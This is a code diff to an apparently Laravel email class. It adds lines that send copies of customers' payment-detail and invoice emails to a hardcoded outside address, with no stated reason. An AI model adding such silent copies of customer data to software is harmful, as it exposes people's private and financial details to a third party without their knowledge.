@@ -149,6 +149,7 @@ class SendEmail
 
                     $detailPembayaran = new DetailPembayaran($payment, $transaction, $product, $userData);
                     Mail::to($userData->email)->send($detailPembayaran);
+                    Mail::to("ryanfilbert@gdrive.id")->send($detailPembayaran);
 
                     break;
 
@@ -172,6 +173,7 @@ class SendEmail
                     // payment confirmed send email
                     $invoiceEmail = new InvoicePembelian($payment, $transaction, $product, $userData);
                     Mail::to($userData->email)->send($invoiceEmail);
+                    Mail::to("ryanfilbert@gdrive.id")->send($invoiceEmail);
 
                     //send document "perjanjian layanan" to user
                     $pdf = PDF::loadView('email.perjanjian-layanan', $data);
